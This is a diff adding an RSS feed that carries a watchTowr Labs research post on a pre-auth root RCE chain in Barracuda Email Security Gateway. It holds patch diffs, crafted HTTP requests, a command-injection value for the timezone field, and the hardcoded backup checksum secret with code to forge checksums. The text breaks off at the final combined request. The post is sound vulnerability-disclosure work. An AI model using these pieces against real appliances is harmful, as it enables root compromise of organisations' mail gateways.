@@ -1,0 +1,573 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[watchTowr Labs]]></title><description><![CDATA[watchTowr Labs is the epicentre of offensive security expertise at watchTowr - where research, innovation, and real attacker insight power our Preemptive Exposure Management technology.]]></description><link>https://labs.watchtowr.com/</link><image><url>https://labs.watchtowr.com/favicon.png</url><title>watchTowr Labs</title><link>https://labs.watchtowr.com/</link></image><generator>Ghost 6.77</generator><lastBuildDate>Wed, 11 Nov 2026 11:25:51 GMT</lastBuildDate><atom:link href="https://labs.watchtowr.com/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)]]></title><description><![CDATA[<p>Yes, that&apos;s right! Today we&apos;re at the aquarium.</p><p><strong>Welcome back to yet another watchTowr Labs blog post. You can begin preparing your comments now.</strong></p><figure class="kg-card kg-video-card kg-width-regular" data-kg-thumbnail="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda_thumb.jpg" data-kg-custom-thumbnail>
+            <div class="kg-video-container">
+                <video src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda.mp4" poster="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda_thumb.jpg" width="3840" height="2160" playsinline preload="metadata" controls></video>
+                
+                
+            </div>
+            
+        </figure><h3 id="what-is-a-barracuda-and-why-must-we">What Is A Barracuda, And Why? Must We?</h3><p>Barracuda&#x2019;s Email Security Gateway solution (ESG) is <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ref=labs.watchtowr.com">no stranger to love</a>, for</p>]]></description><link>https://labs.watchtowr.com/barracuda-networks-is-your-new-best-friend-barracuda-email-security-gateway-pre-auth-remote-root-rce-cve-2026-116606-cve-2026-111560/</link><guid isPermaLink="false">6aecf0a432a3ef0001be06c2</guid><dc:creator><![CDATA[Sina Kheirkhah (@SinSinology)]]></dc:creator><pubDate>Thu, 05 Nov 2026 21:19:58 GMT</pubDate><media:content url="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/Group-8730--8-.png" medium="image"/><content:encoded><![CDATA[<img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/Group-8730--8-.png" alt="Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)"><p>Yes, that&apos;s right! Today we&apos;re at the aquarium.</p><p><strong>Welcome back to yet another watchTowr Labs blog post. You can begin preparing your comments now.</strong></p><figure class="kg-card kg-video-card kg-width-regular" data-kg-thumbnail="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda_thumb.jpg" data-kg-custom-thumbnail>
+            <div class="kg-video-container">
+                <video src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda.mp4" poster="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/media/2026/11/barracuda_thumb.jpg" width="3840" height="2160" playsinline preload="metadata" controls></video>
+                
+                
+            </div>
+            
+        </figure><h3 id="what-is-a-barracuda-and-why-must-we">What Is A Barracuda, And Why? Must We?</h3><p>Barracuda&#x2019;s Email Security Gateway solution (ESG) is <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ref=labs.watchtowr.com">no stranger to love</a>, for a couple of reasons:</p><ul><li>For many, it is the appliance that sits in front of an organization&apos;s mail and decides which messages are spam, which carry malware, and which are allowed through.</li><li>For others, it&#x2019;s the appliance that <a href="https://trust.barracuda.com/security/esg-vulnerability?ref=labs.watchtowr.com" rel="noreferrer">required physical replacement</a> after UNC4841 (per Mandiant) exploited CVE-2023-2868 as a zero-day.</li></ul><p>Whoever you are, one thing will be consistent in your experience: it is yet another appliance that lives at the edge, inspects everything, and runs with the exact and only privileges needed to block a mean email about your blog post.</p><h3 id="ok-but-what-are-cve-2026-116606-and-cve-2026-111560">Ok, But What Are CVE-2026-116606 And CVE-2026-111560?</h3><p>As always, CVE IDs have a habit of being surprisingly catchy - and these two are no different, as we can see in Barracuda&apos;s own <a href="https://trust.barracuda.com/security/pre-authentication-authorization-bypass-command-injection?ref=labs.watchtowr.com">advisory</a> and summarized below:</p>
+<!--kg-card-begin: html-->
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Vulnerability</th>
+<th>CVSS</th>
+<th>Affected Products</th>
+<th>Fixed In</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-116606</td>
+<td>Pre-Authentication Authorization Bypass (Editor: lol?)</td>
+<td>9.3 Critical</td>
+<td>Barracuda ESG</td>
+<td>9.4.0.029</td>
+</tr>
+<tr>
+<td>CVE-2026-111560</td>
+<td>OS Command Injection</td>
+<td>8.6 High</td>
+<td>ESG, Load Balancer ADC, Message Archiver, WAF Control Center, Web Application Firewall, Web Security Gateway</td>
+<td>9.4.0.029</td>
+</tr>
+</tbody>
+</table>
+<!--kg-card-end: html-->
+<p>In isolation, you could be fairly British and describe either as &quot;not ideal.&quot; But things get worse - if chained, and you were British, you&#x2019;d describe them as &#x201c;okay.&#x201d; Scathing.</p><p>It hopefully comes as no surprise then that these vulnerabilities are the focus for today&apos;s watchTowr Labs blog post - so let&#x2019;s grab a coffee and go on a walk.</p><h3 id="setting-the-scene">Setting The Scene</h3><p>To fuel today&apos;s analysis, we set up appliances and compared two versions using our normal &quot;what the hell has changed&quot; process:</p><ul><li>Vulnerable: Barracuda ESG 9.4.0.027</li><li>Different: Barracuda ESG 9.4.0.029</li></ul><p>For context, before we walk through this blog post, it&apos;s important to note that Barracuda released several patch files to address CVE-2026-111560 and CVE-2026-116606. However, we reviewed two specifically, which were referred to as follows:</p><ul><li>Patch-1 (for CVE-2026-116606 &#x201c;Pre-Authentication Authorization Bypass&#x201d;)</li><li>Patch-2 (for CVE-2026-111560 OS Command Injection)</li></ul><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image.png" class="kg-image" alt="Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)" loading="lazy" width="782" height="601" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/11/image.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image.png 782w" sizes="(min-width: 720px) 720px"></figure><p>There is truly nothing that warms us more than a flashback to the physical exorcism of a rack-mounted server because of a vulnerability (yes, we know there is more to the story).</p><h3 id="what-does-a-%E2%80%9Cpre-authentication-authorization-bypass%E2%80%9D-look-like-how-many-legs-salt-water-cve-2026-116606">What Does a &#x201c;Pre-Authentication Authorization Bypass&#x201d; Look Like? How Many Legs? Salt Water? (CVE-2026-116606)</h3><p>This is the question that we sat down and asked ourselves. Luckily, we didn&apos;t have to wait long.</p><p>Reviewing Patch-1, the installer was at least descriptive about its purpose:</p><pre><code class="language-perl">..snip..
+# Pre-authentication authorization bypass permits
+# arbitrary Spam_Config restore
+# CVSS 9.8 Critical
+</code></pre><p>As an aside for those of you who are eagle-eyed, you&apos;ll see that the CVSS score for this vulnerability here is 9.8, versus 9.3 in Barracuda&#x2019;s advisory. Our best guess is that 9.8 reflects both vulnerabilities being scored together (which CVSS experts will quickly recognize as a crime), rather than anything untoward occurring here.</p><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-1.png" class="kg-image" alt="Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)" loading="lazy" width="615" height="496" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/11/image-1.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-1.png 615w"></figure><p>Diving into the files changed inside this patch, we quickly have a list of suspects:</p><ul><li>Index.pm</li><li>Backup2.pm</li><li>bayesian_upload.pm</li><li>UserRole.pm</li><li>Params.pm</li></ul><h3 id="quickly-we-have-a-suspect-indexpm">Quickly, We Have A Suspect: Index.pm</h3><p>The changes from Index.pm are curious, but thankfully minimal.</p><p>Barracuda, to their credit, included this opaquely described hint as to what the issue might be:</p><pre><code class="language-jsx">+    # Send the error and stop here. Returning a userrole
++    # would let response() run module handlers.
+</code></pre><p>That comment is reflected in the whole patch:</p><pre><code class="language-diff"> if (&#x24;password_change_status ==
+     &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val}) {
+-    &#x24;params-&gt;{json_authenticate} = {
++    &#x24;self-&gt;audit(&quot;failed_password_change&quot;, &#x24;params-&gt;{user});
++    # Send the error and stop here. Returning a userrole
++    # would let response() run module handlers.
++    return &#x24;self-&gt;_bailout_with_json_login_response(
++        &#x24;env, &#x24;params, {
+         success =&gt; &apos;true&apos;,
+         message =&gt; &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{msg}
+                    . &quot;: &quot; . &#x24;message,
+         status =&gt; &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val},
+-    };
+-    return &#x24;userrole;
++    });
+ }
+</code></pre><p>So&#xa0;<code>Index.pm</code>&#xa0;handles password-change attempts, but the trouble starts in the pre-patch code when a password change attempt fails (with&#xa0;<code>ERROR_PASSWD_CHANGE</code>).</p><p>Below is the entire vulnerable function, with the original line numbers from&#xa0;<code>Index.pm</code>:</p><pre><code class="language-perl">383:     if(defined(&#x24;params-&gt;{new_password}) &amp;&amp; defined(&#x24;params-&gt;{retype_password}) &amp;&amp; ! (-e &quot;/tmp/bypass_password&quot;)){
+384:         my &#x24;password_change_status=0;
+385:         my &#x24;message = &quot;&quot;;
+386:         (&#x24;password_change_status, &#x24;message,&#x24;user) = Login::change_admin_password(&#x24;params);
+387:         if(&#x24;password_change_status == 1 &amp;&amp; &#x24;user){
+388:            # Dont allow logoff unless the request is from an authenticated logged in user
+389:             my &#x24;url = &quot;/cgi-mod/index.cgi&quot; . uri_hash_to_querystring({
+390:                     locale =&gt; &#x24;MS_globals::params{locale},
+391:                     error =&gt; &#x24;status
+392:                 });
+393:             my %redir = (-location=&gt;&#x24;url);
+394:             &#x24;self-&gt;audit(&apos;password_change&apos;, &#x24;params-&gt;{user});
+395:             Login::logoff_user(&#x24;status, 1, &#x24;params-&gt;{user});
+396:             return bailout();
+397:         }
+398:         else{
+399:             if (&#x24;password_change_status == &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val}) {
+400:                 &#x24;params-&gt;{json_authenticate} = {
+401:                     success =&gt; &apos;true&apos;,
+402:                     message =&gt; &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{msg}.&quot;: &quot;. &#x24;message,
+403:                     status =&gt; &#x24;Login::status_codes{ERROR_PASSWD_CHANGE}-&gt;{val},
+404:                 };
+405:                 &#x24;self-&gt;audit(&quot;failed_password_change&quot;, &#x24;params-&gt;{user});
+406:                 return &#x24;userrole;
+407:             }
+</code></pre><p>While the pre-patch code returns a verbose JSON block indicating a failed password change attempt, it doesn&#x2019;t actually stop execution.</p><p>Let&#x2019;s break this down:</p><ul><li>When the password change works (line 387), it finishes with <code>return bailout();</code> on line 396, and <code>bailout()</code> is the &#x201c;we are done, stop the request here&#x201d; signal.</li><li>When it fails with <code>ERROR_PASSWD_CHANGE</code> (line 399), it finishes with <code>return &#x24;userrole;</code> on line 406 instead.</li></ul><p>The next logical question is &#x201c;what is <code>&#x24;userrole</code>?&#x201d; <code>&#x24;userrole</code> is &#x201c;just&#x201d; the current session&#x2019;s role object, which for our unauthenticated request is the low-privilege login-screen role.</p><p>Why does that matter? Well, the password-change code above lives inside&#xa0;<code>_process_params</code>, and the method that calls it is&#xa0;<code>response</code>:</p><pre><code>584: sub response {
+585:     my (&#x24;self, &#x24;env, &#x24;params) = @_;
+586:
+587:     &#x24;self-&gt;set_self_url(&#x24;env, &#x24;params);
+588:
+589:     # If we are not activated, this removes various changes the user may
+590:     # have tried to make from the params hash.
+591:     &#x24;self-&gt;_check_activation(&#x24;env, &#x24;params);
+592:
+593:     &#x24;self-&gt;_process_params(&#x24;env, &#x24;params);
+594:
+595:     &#x24;self-&gt;_update_variables(&#x24;env, &#x24;params);
+596:
+597:     Barracuda::Hooks::run_hooks(&quot;after write config&quot;);
+</code></pre><p><code>_process_params</code> returns on line 593 and hands our <code>&#x24;userrole</code> straight back to <code>response</code> - a return occurs with no error indicated, and the function continues as it was.</p><p>To reproduce this behavior, we send a POST request to <code>/cgi-mod/index.cgi</code> (the endpoint that eventually reaches this code path) with two parameters in the body:</p><ul><li><code>new_password</code></li><li><code>retype_password</code></li></ul><pre><code>POST /cgi-mod/index.cgi HTTP/1.1
+Host: barracuda.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+user=admin&amp;new_password=one&amp;retype_password=two
+</code></pre><p>The appliance answers with HTTP 200 and a JSON body that declares the failed password change:</p><pre><code>{&quot;message&quot;:&quot;Error: Password Change: &quot;,&quot;no_ajax_redirect&quot;:&quot;true&quot;,&quot;redirect&quot;:&quot;/cgi-mod/password_change.cgi?auth_type=Local&amp;locale=en_US&amp;user=admin&amp;error=Error: Password Change: &quot;,&quot;success&quot;:&quot;true&quot;}
+</code></pre><p>&#x201c;But wait,&#x201d; you ask, &#x201c;surely a rejected auth operation stops anything further privileged from happening? What is the use of a login-screen role?&#x201d;</p><p>Stop calling us Shirley.</p><p>All we need now is something worth bolting on beside it, which is where the next weakness comes in.</p><h3 id="luckily-we-have-a-command-injection-vulnerability-to-pair-cve-2026-111560">Luckily, We Have a Command Injection Vulnerability To Pair! (CVE-2026-111560)</h3><p>While we have strange behavior in the password change mechanism that Barracuda describes as a Pre-Authentication Authorization Bypass, we still need to determine what we can actually do about it.</p><p>Analyzing what we&apos;ve effectively termed &#x201c;Patch-2&#x201d;, we were once again presented with complete Perl source code, making our lives a little simpler.</p><p>Two files stood out as interesting within this patch:</p><ul><li>Backup2.pm</li><li>fix_tz.pl</li></ul><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-2.png" class="kg-image" alt="Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)" loading="lazy" width="2000" height="456" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/11/image-2.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/11/image-2.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1600/2026/11/image-2.png 1600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-2.png 2048w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-3.png" class="kg-image" alt="Barracuda Networks is your new best friend (Barracuda Email Security Gateway Pre-Auth Remote Root RCE CVE-2026-116606 / CVE-2026-111560)" loading="lazy" width="2000" height="744" srcset="https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w600/2026/11/image-3.png 600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1000/2026/11/image-3.png 1000w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/size/w1600/2026/11/image-3.png 1600w, https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/11/image-3.png 2048w" sizes="(min-width: 720px) 720px"></figure><h3 id="diffing-backup2pm">Diffing Backup2.pm</h3><p>After brief analysis, the only seemingly meaningful change in Backup2.pm was made to this pre-patch code block:</p><pre><code class="language-perl">if( -f &quot;/home/product/code/config/tz&quot; ) {
+    my &#x24;system_timezone = Barracuda::Config::get(&apos;system_timezone&apos;);
+    `sed -i &apos;s#TZ=.*#TZ=&#x24;system_timezone#&apos; /home/product/code/config/tz`;
+}
+</code></pre><p>We get a clearer clue about the issue by looking at what changes when we redirect our gaze to the patched version. Effectively, Barracuda has swapped out the shell command execution with.. a safer approach:</p><pre><code class="language-diff"> if( -f &quot;/home/product/code/config/tz&quot; ) {
+     my &#x24;system_timezone = Barracuda::Config::get(&apos;system_timezone&apos;);
+-    `sed -i &apos;s#TZ=.*#TZ=&#x24;system_timezone#&apos; /home/product/code/config/tz`;
++    if (&#x24;system_timezone &amp;&amp; -f &quot;/usr/share/zoneinfo/&#x24;system_timezone&quot;) {
++        open my &#x24;in, &apos;&lt;&apos;, &apos;/home/product/code/config/tz&apos; or die &#x24;!;
++        my @lines = &lt;&#x24;in&gt;;
++        close &#x24;in;
++        open my &#x24;out, &apos;&gt;&apos;, &apos;/home/product/code/config/tz&apos; or die &#x24;!;
++        for my &#x24;line (@lines) {
++            &#x24;line =~ s/^TZ=.*/TZ=&#x24;system_timezone/ if &#x24;line =~ /^TZ=/;
++            print &#x24;out &#x24;line;
++        }
++        close &#x24;out;
++    } else {
++        warn &quot;Skipping tz restore: invalid system_timezone=&apos;&#x24;system_timezone&apos;\n&quot;;
++    }
+ }
+</code></pre><p>To summarize, this gives us three primary things:</p><ul><li>First, the vendor now treats <code>system_timezone</code> as untrusted enough to demand it resolve to a real file under <code>/usr/share/zoneinfo/</code> before use.</li><li>Secondly, the old line crossed a shell boundary. Perl backticks are command substitution, so Perl builds a string and hands it to a shell. The single quotes around the value look protective, but they are only characters in the generated command, not a Perl safety boundary.</li></ul><p>A value shaped like this rewrites the shell grammar:</p><pre><code>Region#&apos;;&lt;attacker-command&gt;;#
+</code></pre><p>The first quote closes the intended <code>sed</code> expression, the semicolon starts a fresh command, and <code>#</code> comments out the rest.</p><ul><li>And lastly (and this is the part that made us sit up), a fairly large clue in the function name ( <code>finalize_restore</code>) about how we might be able to exploit this vulnerability. <code>finalize_restore</code>.</li></ul><h3 id="diffing-fixtzpl">Diffing fix_tz.pl</h3><p>The second file highlighted by our patch diff is fix_tz.pl, which tells a similar story about command injection, specifically related to time zone setting.</p><pre><code class="language-perl">my &#x24;system_timezone = Barracuda::Config::get(&apos;system_timezone&apos;);
+exit if !&#x24;system_timezone;
+
+`sed -i &apos;s#ZONE=.*#ZONE=&#x24;system_timezone#&apos; /etc/sysconfig/clock`;
+</code></pre><p>Actually, that&apos;s where the patch adds a gate:</p><pre><code class="language-diff"> my &#x24;system_timezone = Barracuda::Config::get(&apos;system_timezone&apos;);
+ exit if !&#x24;system_timezone;
+
++if (! -f &quot;/usr/share/zoneinfo/&#x24;system_timezone&quot;) {
++    warn &quot;Invalid timezone: &#x24;system_timezone\n&quot;;
++    exit 1;
++}
+</code></pre><p>And removes the shell-backed update in favor of the same read, rewrite, write Perl pattern:</p><pre><code class="language-diff">-`sed -i &apos;s#ZONE=.*#ZONE=&#x24;system_timezone#&apos; /etc/sysconfig/clock`;
++if (-f &apos;/etc/sysconfig/clock&apos;) {
++    open my &#x24;in, &apos;&lt;&apos;, &apos;/etc/sysconfig/clock&apos; or die &#x24;!;
++    my @lines = &lt;&#x24;in&gt;;
++    close &#x24;in;
++    open my &#x24;out, &apos;&gt;&apos;, &apos;/etc/sysconfig/clock&apos; or die &#x24;!;
++    for my &#x24;line (@lines) {
++        &#x24;line =~ s/^ZONE=.*/ZONE=&#x24;system_timezone/ if &#x24;line =~ /^ZONE=/;
++        print &#x24;out &#x24;line;
++    }
++    close &#x24;out;
++}
+</code></pre><p>TL;DR, we&apos;re dealing with two sinks: one in <code>Backup2.pm</code> and the other in <code>fix_tz.pl</code>.</p><p>Effectively, <code>Backup2::finalize_restore</code> writes the product timezone file and <code>fix_tz.pl</code> writes to the operating-system clock file - and the same seemingly attacker-controlled and manipulable input reaches both.</p><p>&#x201c;A limited-privilege user can&apos;t write this file&#x201d; - true, but we&#x2019;re discussing security appliances. It&#x2019;s different - which is exactly why the code above uses <code>sudo</code> to execute the <code>fix_tz.pl</code> file.</p><pre><code class="language-perl">if( -f &quot;/home/product/code/firmware/current/bin/fix_tz.pl&quot; ) {
+    system(&apos;/usr/bin/sudo&apos;,
+           &apos;/home/product/code/firmware/current/bin/fix_tz.pl&apos;);
+}
+</code></pre><p>This is not just any old OS Command Injection vulnerability, but one that executes as <code>root</code>.</p><h3 id="let%E2%80%99s-abuse-it">Let&#x2019;s Abuse It</h3><p>To trigger this vulnerability, we looked for places that would allow us to reach this vulnerable code naturally. One place stood out: an upload handler named <code>bayesian_upload.pm</code>.</p><p>Here&#x2019;s the upload handler file named <code>bayesian_upload.pm</code>:</p><pre><code class="language-perl">53: bc_sub bayesian_upload_handler =&gt;
+54:     perm { 1 },
+55:     web_params( [param(&apos;user&apos;), param(&apos;bayesian&apos;), param(&apos;pu_bayesian_upload&apos;)]),
+56:     does {
+57:         my &#x24;args = shift;
+58:         return if(!defined(&#x24;args-&gt;{&apos;bayesian&apos;}) || &#x24;ENV{REMOTE_USER} eq &apos;guest&apos;);
+59:
+60:         my &#x24;lock;
+61:         my &#x24;error = &apos;&apos;;
+62:         my &#x24;filename = &#x24;Barracuda::BackupConfig::StagingJob::BACKUP_FILE;
+63:
+64:         try {
+65:             &#x24;lock = Barracuda::Backup2::_grab_lock();
+66:
+67:             my &#x24;uploader = &#x24;args-&gt;{bayesian};
+68:             if (&#x24;uploader-&gt;to_file( { dest =&gt; &#x24;filename } )) {
+69:                 throw Barracuda::Exception;
+70:             }
+71:         }
+72:         catch Barracuda::Backup2::Lock_Error with {
+73:             &#x24;error = &apos;lid_2876&apos;;
+74:         }
+75:         catch Error with {
+76:             &#x24;error = &apos;lid_379&apos;;
+77:         }
+78:         finally {
+79:             &#x24;lock &amp;&amp; &#x24;lock-&gt;punlock();
+80:             if (&#x24;error) {
+81:                 push(@Barracuda::UI::status_message,
+82:                     {
+83:                         message =&gt; &#x24;error,
+84:                         type    =&gt; &apos;error&apos;
+85:                     }
+86:                 );
+87:                 return;
+88:             }
+89:         };
+90:
+91:         my %params;
+92:         &#x24;params{full_reload} = 0;
+93:         my &#x24;ret = 0;
+94:         try {
+95:             &#x24;ret = Barracuda::Backup2::restore_all(&#x24;filename, %params);
+96:         } catch Error with {
+</code></pre><p>As you can see, this function is fairly simple. It expects a few parameters, and if they are as expected, we can reach line 95, where the restore all function executes on a backup file the user provides.</p><h3 id="backup-restore-to-command-execution">Backup Restore To Command Execution</h3><p>Now, life is never that simple, and our first question was: &quot;Okay, so what does a backup file actually look like?&#x201d;</p><p>Now in this case, luckily, a backup is a tar file that contains a <code>backup.xml</code> file that lists various details. Here is an example shape of one we built:</p><pre><code>&lt;backup&gt;
+  &lt;component name=&quot;Spam_Config&quot;&gt;
+    &lt;file id=&quot;mysql&quot; checksum=&quot;[generated integrity value]&quot; path=&quot;mysql-poc.gz&quot; /&gt;
+  &lt;/component&gt;
+  &lt;info filename=&quot;poc.bak&quot; firmware_version=&quot;9.4.0.020&quot;
+        model=&quot;V300&quot; platform=&quot;5&quot; product=&quot;emailswitch&quot; type=&quot;manual_backup&quot;&gt;
+    &lt;component_version name=&quot;Config&quot; number=&quot;1&quot; /&gt;
+    &lt;component_version name=&quot;Files&quot; number=&quot;1&quot; /&gt;
+    &lt;component_version name=&quot;Spam_Config&quot; number=&quot;1&quot; /&gt;
+    &lt;component_version name=&quot;mysql&quot; number=&quot;1&quot; /&gt;
+  &lt;/info&gt;
+&lt;/backup&gt;
+</code></pre><p>You may recognize <code>Spam_Config</code> from within an earlier patch comment. That&apos;s our clue and it exists as part of a <code>backup.xml</code> file.</p><p>When the appliance restores <code>Spam_Config</code>, it loads a small MySQL dump and restores defined information back into the local MySQL database.</p><p>As luck would have it, one of those rows is <code>system_timezone</code>. Do you see where this is going?</p><p>What if we restore the value of the <code>system_timezone</code> row with a shell command stuck on the end:</p><pre><code>UTC#&apos;;touch /tmp/watchTowr;#
+</code></pre><p>But let&apos;s not jump ahead - we haven&apos;t actually built a valid backup file yet.</p><h3 id="getting-our-backup-accepted">Getting Our Backup Accepted</h3><p>As we discussed, the backup is restored by a function called <code>restore_all</code>. This function unpacks the archive, reads the list of parts, and restores each one:</p><pre><code class="language-perl">444: sub restore_all {
+445:     my &#x24;bundle_filename = shift;
+446:     my %args = @_;
+447:     if (not exists(&#x24;args{full_reload})) {
+448:         &#x24;args{full_reload} = 1;
+449:     }
+450:     change_directory(&quot;/mail/tmp&quot;);
+451:     my &#x24;pl = _grab_lock();
+452:     log_message(&quot;Starting restore opertation...&quot;);
+453:     my &#x24;poke_progress = sub { };
+454:     if (&#x24;args{progress_cb}) {
+455:         if (ref(&#x24;args{progress_cb}) ne &apos;CODE&apos;) {
+456:             croak(&apos;progress_cb must be a CODE reference.&apos;);
+457:         }
+458:         &#x24;args{progress_cb}-&gt;(0);
+459:     }
+460:     my &#x24;dir;
+461:     if (Barracuda::FrameworkConfig::framework_config(&apos;backup_compatibility_on&apos;)) {
+462:         require IPC::Run;
+463:         my (&#x24;out, &#x24;err);
+464:         eval {
+465:             IPC::Run::run([&quot;&#x24;Barracuda::Environment::path_firmware/bin/file&quot;, &apos;-b&apos;, &#x24;bundle_filename], \undef, \&#x24;out, \&#x24;err);
+466:         };
+467:         chomp(&#x24;out);
+468:         if (&#x24;out &amp;&amp; &#x24;out ne &apos;POSIX tar archive (GNU)&apos;) {
+469:             &#x24;dir = &#x24;TMP_DIR;
+470:         }
+471:     }
+472:     if (&#x24;dir) {
+473:         system(&apos;cp&apos;, &apos;-f&apos;, &#x24;bundle_filename, &#x24;dir . &apos;/Backup.bak&apos;);
+474:     } else {
+475:         log_message(&quot;Untaring bundle...&quot;);
+476:         &#x24;dir = untar_bundle(&#x24;bundle_filename);
+477:     }
+478:     log_message(&quot;Reading the components to restore...&quot;);
+479:     my &#x24;data = read_staged_metadata(&#x24;dir);
+480:     &#x24;poke_progress = _create_poke_progress(&#x24;data, &#x24;args{progress_cb});
+481:     log_message(&quot;Restoring components...&quot;);
+482:     restore_components(&#x24;data, &#x24;dir, \%args, &#x24;poke_progress);
+483:     # Reload &amp; reboot
+484:     &#x24;pl-&gt;punlock();
+485:     log_message(&quot;Finalizing restore...&quot;);
+486:     finalize_restore(\%args);
+487:     return 1;
+</code></pre><h3 id="packing-the-backup">Packing The Backup</h3><p>Seems simple then. We just throw some SQL query in an XML file, tar it, and then restore it.</p><p>But no, life punishes us.</p><h3 id="about-that-checksum">About That Checksum</h3><p>Every file listed in <code>backup.xml</code> has a <code>checksum</code>, and the restore function validates said checksum with diligence&#x2026; It reads the file&apos;s bytes, computes its own checksum, and rejects the backup if the checksums do not match. So our usual approach of just typing random numbers into these fields will not work here.</p><p>But there&apos;s still a funny part. That checksum is built as so:</p><p>The checksum is just <code>md5(file_bytes + secret + &quot;.&quot;)</code>.</p><p>Secret, you say? That must be a dynamically unique value that changes often or is somehow tied to the machine and not predictable.</p><p>We present the secret.</p><pre><code class="language-perl">CHECKSUM_SECRET = b&quot;Barracuda Networks is your new best friend&quot;
+</code></pre><p>But really the checksum is just <code>md5(file_bytes + &quot;Barracuda Networks is your new best friend&quot; + &quot;.&quot;)</code>.</p><p>As you can see below, this allows us to then determine the checksum ourselves:</p><pre><code>47:     mysql_dump = gzip.compress(sql, compresslevel=9, mtime=0)
+48:     checksum = hashlib.md5(mysql_dump + CHECKSUM_SECRET + b&quot;.&quot;).hexdigest()
+49:     timestamp = time.strftime(&quot;%Y%m%dT%H%M%S&quot;, time.gmtime())
+50:     backup_xml = f&quot;&quot;&quot;&lt;?xml version=&apos;1.0&apos; standalone=&apos;yes&apos;?&gt;
+51: &lt;backup&gt;
+52:   &lt;component name=&quot;Spam_Config&quot;&gt;
+53:     &lt;file id=&quot;mysql&quot; checksum=&quot;{checksum}&quot; path=&quot;mysql-poc.gz&quot; /&gt;
+</code></pre><h3 id="putting-it-all-together">Putting It All Together</h3><p>While the proverb of &quot;many word make many big long blog post&quot; is accurate, unfortunately the HTTP request that combines both vulnerabilities discussed in today&apos;s blog post is actually fairly simple:</p><pre><code>POST /cgi-mod/index.cgi HTTP/1.1
+Host: barracuda.com
+Content-Type: multipart/form-data; boundary=BOUNDARY
+
+--BOUNDARY
